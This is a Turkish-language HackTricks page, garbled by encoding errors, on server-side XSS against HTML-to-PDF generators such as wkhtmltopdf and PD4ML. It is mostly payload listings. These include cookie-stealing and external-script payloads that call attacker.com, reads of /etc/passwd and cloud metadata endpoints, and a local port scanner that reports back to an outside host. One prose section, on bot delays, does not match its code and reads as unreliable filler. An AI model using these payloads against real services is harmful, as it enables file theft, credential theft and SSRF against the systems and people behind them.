# Sunucu TarafÄ± XSS (Dinamik PDF)

<details>

<summary><strong>AWS hacklemeyi sÄ±fÄ±rdan kahraman olmak iÃ§in</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS KÄ±rmÄ±zÄ± TakÄ±m UzmanÄ±)</strong></a><strong> Ã¶ÄŸrenin!</strong></summary>

HackTricks'i desteklemenin diÄŸer yollarÄ±:

* **Åirketinizi HackTricks'te reklam vermek** veya **HackTricks'i PDF olarak indirmek** iÃ§in [**ABONELÄ°K PLANLARINI**](https://github.com/sponsors/carlospolop) kontrol edin!
* [**Resmi PEASS & HackTricks Ã¼rÃ¼nlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keÅŸfedin, Ã¶zel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katÄ±lÄ±n** veya **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)**'Ä± takip edin**.
* **Hacking hilelerinizi** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarÄ±na **PR gÃ¶ndererek paylaÅŸÄ±n**.

</details>

## Sunucu TarafÄ± XSS (Dinamik PDF)

Bir web sayfasÄ± kullanÄ±cÄ± tarafÄ±ndan kontrol edilen giriÅŸleri kullanarak bir PDF oluÅŸturuyorsa, PDF oluÅŸturan botu **keyfi JS kodu yÃ¼rÃ¼tmeye kandÄ±rmayÄ±** deneyebilirsiniz.\
Yani, **PDF oluÅŸturan bot**, bazÄ± **HTML** **etiketlerini** bulursa, onlarÄ± **yorumlayacak** ve bu davranÄ±ÅŸÄ± **suistimal ederek** bir **Sunucu XSS** oluÅŸturabilirsiniz.

LÃ¼tfen, `<script></script>` etiketlerinin her zaman Ã§alÄ±ÅŸmadÄ±ÄŸÄ±nÄ± fark edin, bu yÃ¼zden JS'yi yÃ¼rÃ¼tmek iÃ§in farklÄ± bir yÃ¶nteme ihtiyacÄ±nÄ±z olacak (Ã¶rneÄŸin, `<img` etiketini suistimal ederek).\
AyrÄ±ca, dÃ¼zenli bir saldÄ±rÄ±da oluÅŸturulan pdf'yi **gÃ¶rebilecek/indirebileceÄŸinizi** unutmayÄ±n, bu yÃ¼zden JS kullanarak yazdÄ±ÄŸÄ±nÄ±z her ÅŸeyi gÃ¶rebileceksiniz (`document.write()` Ã¶rneÄŸin). Ancak, oluÅŸturulan PDF'yi **gÃ¶remiyorsanÄ±z**, muhtemelen bilgiyi sizinle **web isteÄŸi yaparak Ã§Ä±karmak** iÃ§in ihtiyacÄ±nÄ±z olacaktÄ±r (KÃ¶r).

### PopÃ¼ler PDF oluÅŸturma

- **wkhtmltopdf**, HTML ve CSS'yi PDF belgelerine dÃ¶nÃ¼ÅŸtÃ¼rme yeteneÄŸiyle tanÄ±nÄ±r ve WebKit render motorunu kullanÄ±r. Bu araÃ§, geniÅŸ bir uygulama yelpazesine eriÅŸilebilir bir aÃ§Ä±k kaynaklÄ± komut satÄ±rÄ± yardÄ±mcÄ± programÄ± olarak mevcuttur.
- **TCPDF**, PDF oluÅŸturma iÃ§in PHP ekosistemi iÃ§inde saÄŸlam bir Ã§Ã¶zÃ¼m sunar. GÃ¶rÃ¼ntÃ¼, grafik ve ÅŸifreleme iÅŸleme yeteneÄŸine sahiptir ve karmaÅŸÄ±k belgeler oluÅŸturmak iÃ§in Ã§ok yÃ¶nlÃ¼lÃ¼ÄŸÃ¼nÃ¼ sergiler.
- Bir Node.js ortamÄ±nda Ã§alÄ±ÅŸanlar iÃ§in, **PDFKit** kullanÄ±labilir bir seÃ§enek sunar. HTML ve CSS'den doÄŸrudan PDF belgeleri oluÅŸturmayÄ± saÄŸlar ve web iÃ§eriÄŸi ile yazdÄ±rÄ±labilir formatlar arasÄ±nda bir kÃ¶prÃ¼ gÃ¶revi gÃ¶rÃ¼r.
- Java geliÅŸtiricileri, PDF oluÅŸturmanÄ±n yanÄ± sÄ±ra dijital imzalar ve form doldurma gibi geliÅŸmiÅŸ Ã¶zellikleri de destekleyen bir kÃ¼tÃ¼phane olan **iText**'i tercih edebilirler. KapsamlÄ± Ã¶zellik seti, gÃ¼venli ve etkileÅŸimli belgeler oluÅŸturmak iÃ§in uygundur.
- **FPDF**, basitliÄŸi ve kullanÄ±m kolaylÄ±ÄŸÄ±yla ayÄ±rt edilen baÅŸka bir PHP kÃ¼tÃ¼phanesidir. KapsamlÄ± Ã¶zelliklere ihtiyaÃ§ duymadan PDF oluÅŸturma konusunda basit bir yaklaÅŸÄ±m arayan geliÅŸtiriciler iÃ§in tasarlanmÄ±ÅŸtÄ±r.


## Payloadlar

### KeÅŸif
```markup
<!-- Basic discovery, Write somthing-->
<img src="x" onerror="document.write('test')" />
<script>document.write(JSON.stringify(window.location))</script>
<script>document.write('<iframe src="'+window.location.href+'"></iframe>')</script>

<!--Basic blind discovery, load a resource-->
<img src="http://attacker.com"/>
<img src=x onerror="location.href='http://attacker.com/?c='+ document.cookie">
<script>new Image().src="http://attacker.com/?c="+encodeURI(document.cookie);</script>
<link rel=attachment href="http://attacker.com">
```
### SVG

Bu SVG yÃ¼klemesi iÃ§inde Ã¶nceki veya aÅŸaÄŸÄ±daki yÃ¼klemelerden herhangi biri kullanÄ±labilir. Bir iframe, Burpcollab alt alanÄ±na eriÅŸen ve diÄŸer bir iframe, meta veri uÃ§ noktasÄ±na eriÅŸen Ã¶rnekler olarak eklenmiÅŸtir.
```markup
<svg xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1" class="root" width="800" height="500">
<g>
<foreignObject width="800" height="500">
<body xmlns="http://www.w3.org/1999/xhtml">
<iframe src="http://redacted.burpcollaborator.net" width="800" height="500"></iframe>
<iframe src="http://169.254.169.254/latest/meta-data/" width="800" height="500"></iframe>
</body>
</foreignObject>
</g>
</svg>


<svg width="100%" height="100%" viewBox="0 0 100 100"
xmlns="http://www.w3.org/2000/svg">
<circle cx="50" cy="50" r="45" fill="green"
id="foo"/>
<script type="text/javascript">
// <![CDATA[
alert(1);
// ]]>
</script>
</svg>
```
AÅŸaÄŸÄ±da, **diÄŸer SVG yÃ¼kleri** iÃ§in [**https://github.com/allanlw/svg-cheatsheet**](https://github.com/allanlw/svg-cheatsheet) adresinde bulabileceÄŸiniz birÃ§ok Ã¶rnek bulunmaktadÄ±r.

### Yol ifÅŸasÄ±
```markup
<!-- If the bot is accessing a file:// path, you will discover the internal path
if not, you will at least have wich path the bot is accessing -->
<img src="x" onerror="document.write(window.location)" />
<script> document.write(window.location) </script>
```
### Harici bir script yÃ¼kle

Bu zafiyeti en iyi ÅŸekilde sÃ¶mÃ¼rmek iÃ§in, botun yerel olarak kontrol ettiÄŸiniz bir script yÃ¼klemesini saÄŸlamak iÃ§in zafiyeti istismar etmek en uygun yoldur. ArdÄ±ndan, payload'u yerel olarak deÄŸiÅŸtirebilir ve her seferinde aynÄ± kodla botun bunu yÃ¼klemesini saÄŸlayabilirsiniz.
```markup
<script src="http://attacker.com/myscripts.js"></script>
<img src="xasdasdasd" onerror="document.write('<script src="https://attacker.com/test.js"></script>')"/>
```
### Yerel dosya okuma / SSRF

{% hint style="warning" %}
Ã–rneÄŸin `file:///etc/passwd` yerine `http://169.254.169.254/latest/user-data` gibi **harici bir web sayfasÄ±na eriÅŸmeyi denemek iÃ§in (SSRF)** deÄŸiÅŸtirin.

EÄŸer SSRF izin veriliyorsa, ancak ilginÃ§ bir alan adÄ±na veya IP'ye **ulaÅŸamÄ±yorsanÄ±z**, [potansiyel bypasslar iÃ§in bu sayfayÄ± kontrol edin](../ssrf-server-side-request-forgery/url-format-bypass.md).
{% endhint %}
```markup
<script>
x=new XMLHttpRequest;
x.onload=function(){document.write(btoa(this.responseText))};
x.open("GET","file:///etc/passwd");x.send();
</script>
```

```markup
<script>
xhzeem = new XMLHttpRequest();
xhzeem.onload = function(){document.write(this.responseText);}
xhzeem.onerror = function(){document.write('failed!')}
xhzeem.open("GET","file:///etc/passwd");
xhzeem.send();
</script>
```

```markup
<iframe src=file:///etc/passwd></iframe>
<img src="xasdasdasd" onerror="document.write('<iframe src=file:///etc/passwd></iframe>')"/>
<link rel=attachment href="file:///root/secret.txt">
<object data="file:///etc/passwd">
<portal src="file:///etc/passwd" id=portal>
<embed src="file:///etc/passwd>" width="400" height="400">
<style><iframe src="file:///etc/passwd">
<img src='x' onerror='document.write('<iframe src=file:///etc/passwd></iframe>')'/>&text=&width=500&height=500
<meta http-equiv="refresh" content="0;url=file:///etc/passwd" />
```

```markup
<annotation file="/etc/passwd" content="/etc/passwd" icon="Graph" title="Attached File: /etc/passwd" pos-x="195" />
```
### Bot gecikmesi

Bir web uygulamasÄ±nÄ± hedef alÄ±rken, bazen hedefin botlarÄ± tespit etmek ve engellemek iÃ§in bir gecikme mekanizmasÄ± kullanabileceÄŸini fark edebilirsiniz. Bu gecikme mekanizmasÄ±, botlarÄ±n hÄ±zlÄ± bir ÅŸekilde istek gÃ¶ndermesini engelleyerek, otomatik saldÄ±rÄ±larÄ± zorlaÅŸtÄ±rÄ±r.

Bu durumda, botlarÄ±n tespit edilmesini Ã¶nlemek iÃ§in bazÄ± teknikler kullanabilirsiniz. Ã–rneÄŸin, botlarÄ±n tespit etmesini zorlaÅŸtÄ±rmak iÃ§in rastgele gecikmeler ekleyebilirsiniz. Bu, botlarÄ±n belirli bir kalÄ±ba gÃ¶re istek gÃ¶ndermesini engelleyerek, tespit edilmelerini zorlaÅŸtÄ±rÄ±r.

Bununla birlikte, bot gecikmesini aÅŸmak iÃ§in bazÄ± yÃ¶ntemler de vardÄ±r. Ã–rneÄŸin, birden fazla IP adresi kullanarak botlarÄ± daÄŸÄ±tabilir veya botlarÄ±n tespit edilmesini Ã¶nlemek iÃ§in kullanÄ±cÄ± ajanlarÄ±nÄ± deÄŸiÅŸtirebilirsiniz.

SonuÃ§ olarak, bot gecikmesi, web uygulamalarÄ±nÄ± hedef alan saldÄ±rÄ±larÄ± zorlaÅŸtÄ±ran bir gÃ¼venlik Ã¶nlemidir. Ancak, bu Ã¶nlemi aÅŸmak iÃ§in Ã§eÅŸitli teknikler kullanÄ±labilir.
```markup
<!--Make the bot send a ping every 500ms to check how long does the bot wait-->
<script>
let time = 500;
setInterval(()=>{
let img = document.createElement("img");
img.src = `https://attacker.com/ping?time=${time}ms`;
time += 500;
}, 500);
</script>
<img src="https://attacker.com/delay">
```
### Port TaramasÄ±

Port taramasÄ±, bir hedef sistemdeki aÃ§Ä±k portlarÄ± belirlemek iÃ§in kullanÄ±lan bir tekniktir. Bu teknik, bir saldÄ±rganÄ±n hedef sistemdeki aÄŸ servislerini keÅŸfetmesine ve potansiyel zayÄ±flÄ±klarÄ± tespit etmesine olanak tanÄ±r. Port taramasÄ±, saldÄ±rganÄ±n hedef sistemdeki aÄŸ servislerine eriÅŸim saÄŸlamak iÃ§in kullanabileceÄŸi potansiyel hedefleri belirlemesine yardÄ±mcÄ± olur. Bu bilgi, saldÄ±rganÄ±n hedef sistemdeki gÃ¼venlik aÃ§Ä±klarÄ±nÄ± sÃ¶mÃ¼rmek iÃ§in kullanabileceÄŸi bir baÅŸlangÄ±Ã§ noktasÄ± saÄŸlar. Port taramasÄ± genellikle gÃ¼venlik testleri ve aÄŸ keÅŸfi sÄ±rasÄ±nda kullanÄ±lÄ±r.
```markup
<!--Scan local port and receive a ping indicating which ones are found-->
<script>
const checkPort = (port) => {
fetch(`http://localhost:${port}`, { mode: "no-cors" }).then(() => {
let img = document.createElement("img");
img.src = `http://attacker.com/ping?port=${port}`;
});
}

for(let i=0; i<1000; i++) {
checkPort(i);
}
</script>
<img src="https://attacker.com/startingScan">
```
### [SSRF](../ssrf-server-side-request-forgery/)

Bu zafiyet Ã§ok kolay bir ÅŸekilde SSRF'ye dÃ¶nÃ¼ÅŸtÃ¼rÃ¼lebilir (Ã§Ã¼nkÃ¼ betik harici kaynaklarÄ± yÃ¼kleyebilirsiniz). Bu yÃ¼zden sadece bunu istismar etmeyi deneyin (bazÄ± meta verileri okuyun?).

### Ekler: PD4ML

PD4ML gibi bazÄ± HTML 2 PDF motorlarÄ±, PDF'ye ekler belirlemeye izin verir. Bu Ã¶zelliÄŸi istismar ederek PDF'ye herhangi bir yerel dosya ekleyebilirsiniz.\
Ekleri aÃ§mak iÃ§in dosyayÄ± Firefox ile aÃ§tÄ±m ve KaÄŸÄ±t Klipsi simgesine Ã§ift tÄ±kladÄ±m ve eklemeyi yeni bir dosya olarak kaydettim.\
PDF yanÄ±tÄ±nÄ± burp ile yakalamak ayrÄ±ca PDF iÃ§inde ekleri aÃ§Ä±k metin olarak gÃ¶stermelidir.

{% code overflow="wrap" %}
```html
<!-- From https://0xdf.gitlab.io/2021/04/24/htb-bucket.html -->
<html><pd4ml:attachment src="/etc/passwd" description="attachment sample" icon="Paperclip"/></html>
```
{% endcode %}

## Referanslar

* [https://lbherrera.github.io/lab/h1415-ctf-writeup.html](https://lbherrera.github.io/lab/h1415-ctf-writeup.html)
* [https://buer.haus/2017/06/29/escalating-xss-in-phantomjs-image-rendering-to-ssrflocal-file-read/](https://buer.haus/2017/06/29/escalating-xss-in-phantomjs-image-rendering-to-ssrflocal-file-read/)
* [https://www.noob.ninja/2017/11/local-file-read-via-xss-in-dynamically.html](https://www.noob.ninja/2017/11/local-file-read-via-xss-in-dynamically.html)
* [https://infosecwriteups.com/breaking-down-ssrf-on-pdf-generation-a-pentesting-guide-66f8a309bf3c](https://infosecwriteups.com/breaking-down-ssrf-on-pdf-generation-a-pentesting-guide-66f8a309bf3c)

<details>

<summary><strong>AWS hackleme konusunda sÄ±fÄ±rdan kahramana dÃ¶nÃ¼ÅŸmek iÃ§in</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS KÄ±rmÄ±zÄ± TakÄ±m UzmanÄ±)</strong></a><strong>'Ä± Ã¶ÄŸrenin!</strong></summary>

HackTricks'i desteklemenin diÄŸer yollarÄ±:

* **Åirketinizi HackTricks'te reklamÄ±nÄ±zÄ± gÃ¶rmek veya HackTricks'i PDF olarak indirmek** iÃ§in [**ABONELÄ°K PLANLARINI**](https://github.com/sponsors/carlospolop) kontrol edin!
* [**Resmi PEASS & HackTricks Ã¼rÃ¼nlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keÅŸfedin, Ã¶zel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family)
* ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katÄ±lÄ±n** veya **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)**'Ä± takip edin.**
* **Hacking hilelerinizi** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna **PR gÃ¶ndererek paylaÅŸÄ±n**.

</details>
